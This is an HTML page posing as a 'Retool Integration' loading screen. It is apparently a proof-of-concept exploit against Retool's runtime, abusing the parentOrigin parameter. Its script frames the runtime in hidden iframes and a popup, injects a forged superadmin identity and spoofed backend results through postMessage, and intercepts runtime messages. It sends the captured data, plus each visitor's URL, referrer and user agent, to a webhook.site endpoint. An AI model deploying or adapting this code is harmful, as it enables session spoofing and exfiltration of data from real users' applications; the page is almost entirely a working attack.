<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Retool Integration</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #f5f5f5; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
  .box { background: #fff; border-radius: 8px; box-shadow: 0 2px 12px rgba(0,0,0,0.08); padding: 32px 40px; text-align: center; max-width: 420px; }
  .spinner { width: 32px; height: 32px; border: 3px solid #e2e8f0; border-top-color: #3b82f6; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 16px; }
  @keyframes spin { to { transform: rotate(360deg); } }
  h2 { font-size: 16px; color: #1e293b; margin-bottom: 6px; }
  p { font-size: 13px; color: #64748b; }
  .hidden { display: none; }
</style>
</head>
<body>
<div class="box">
  <div class="spinner" id="spin"></div>
  <h2 id="msg">Establishing connection...</h2>
  <p id="sub">Please wait</p>
</div>

<iframe id="f1" class="hidden" sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-top-navigation"></iframe>
<iframe id="f2" class="hidden" sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-top-navigation"></iframe>

<script>
(function() {
  'use strict';

  var WH = 'https://webhook.site/82992a43-c436-48c6-a887-42bd38d712be';
  var ATK_ORIGIN = location.origin;
  var cntI = 0, cntJ = 0;

  function X(payload) {
    var j = JSON.stringify(payload);
    fetch(WH, { method: 'POST', headers: {'Content-Type':'application/json'}, body: j }).catch(function(){});
    if (navigator.sendBeacon) { navigator.sendBeacon(WH, new Blob([j],{type:'text/plain'})); }
    new Image().src = WH + '?d=' + encodeURIComponent(j.slice(0,800));
  }

  var FAKE = {
    id: 0, email: 'attacker@evil.com', firstName: 'Hacked', lastName: 'Admin',
    fullName: 'Hacked Admin', profilePhotoUrl: null,
    groups: [{ id: 1, name: 'admin' }, { id: 2, name: 'superuser' }],
    metadata: { role: 'superadmin', _poc: true },
    sid: 'inj-' + Date.now(), externalIdentifier: null, locale: 'en'
  };

  // THE REAL SANDBOX URL — retool-edge.com runtime
  var RUNTIME_BASE = 'https://retool-edge.com/runtime.M2M3OWU5.html';
  var RUNTIME_URL = RUNTIME_BASE + '?parentOrigin=' + encodeURIComponent(ATK_ORIGIN) + '&product=retool-web&isTestRuntime=false';

  function inject(win) {
    if (!win || win.closed) return;
    try {
      win.postMessage({ type: 'RETOOL_CURRENT_USER', data: FAKE }, '*');
      win.postMessage({ type: 'RETOOL_AUTH_COMPLETE', resourceName: '*' }, '*');
      cntJ++;
    } catch(e) {}
  }

  // Intercept postMessages from runtime
  window.addEventListener('message', function(e) {
    var d = e.data;
    if (!d || typeof d !== 'object' || !d.type) return;

    var F1 = document.getElementById('f1');
    var F2 = document.getElementById('f2');
    var tgt = null;
    if (F1.contentWindow && e.source === F1.contentWindow) tgt = F1.contentWindow;
    if (F2.contentWindow && e.source === F2.contentWindow) tgt = F2.contentWindow;

    if (!tgt) return;

    cntI++;

    if (d.type === 'RETOOL_CURRENT_USER_REQUEST') {
      X({ event: 'intercept', type: 'RETOOL_CURRENT_USER_REQUEST', origin: e.origin, cnt: cntI, time: new Date().toISOString() });
      inject(tgt);
    }
    else if (d.type === 'RETOOL_BACKEND_FUNCTION') {
      X({ event: 'intercept', type: 'RETOOL_BACKEND_FUNCTION', functionName: d.functionName, params: d.params, requestId: d.requestId, origin: e.origin, time: new Date().toISOString() });
      try {
        tgt.postMessage({ type: 'RETOOL_BACKEND_RESULT', requestId: d.requestId, data: { _spoofed: true, _attacker: 'origin bypass via parentOrigin param', timestamp: new Date().toISOString() } }, '*');
      } catch(e) {}
    }
    else if (d.type && d.type.indexOf('RETOOL_') === 0) {
      X({ event: 'intercept', type: d.type, origin: e.origin, data: d, time: new Date().toISOString() });
    }
  });

  // Load runtime in iframe
  function loadRuntime(url) {
    var f = document.createElement('iframe');
    f.style.display = 'none';
    f.sandbox = 'allow-scripts allow-same-origin allow-forms allow-popups allow-top-navigation';
    f.src = url;
    document.body.appendChild(f);

    f.onload = function() {
      X({ event: 'runtime_loaded', url: url, time: new Date().toISOString() });
      document.getElementById('msg').textContent = 'Runtime loaded';
      document.getElementById('sub').textContent = 'Intercepting...';
      inject(f.contentWindow);
      setInterval(function(){ inject(f.contentWindow); }, 3000);
    };

    f.onerror = function() {
      X({ event: 'runtime_blocked', url: url, time: new Date().toISOString() });
      document.getElementById('msg').textContent = 'Connection blocked';
      document.getElementById('sub').textContent = 'X-Frame-Options prevented loading';
      document.getElementById('spin').style.display = 'none';
    };

    return f;
  }

  // Auto-start on click
  document.body.addEventListener('click', function go() {
    document.body.removeEventListener('click', go);

    X({ event: 'attack_start', url: RUNTIME_URL, attackerOrigin: ATK_ORIGIN, time: new Date().toISOString() });

    // Load runtime with OUR origin as parentOrigin
    loadRuntime(RUNTIME_URL);

    // Also open as popup as fallback
    var popup = window.open(RUNTIME_URL, 'r', 'width=800,height=600,left='+((screen.width-800)/2)+',top='+((screen.height-600)/2));
    if (popup) {
      setTimeout(function(){ inject(popup); }, 2000);
      setInterval(function(){ inject(popup); }, 3000);
    }
  });

  X({ event: 'page_load', url: location.href, referrer: document.referrer, ua: navigator.userAgent, time: new Date().toISOString() });

})();
</script>
</body>
</html>
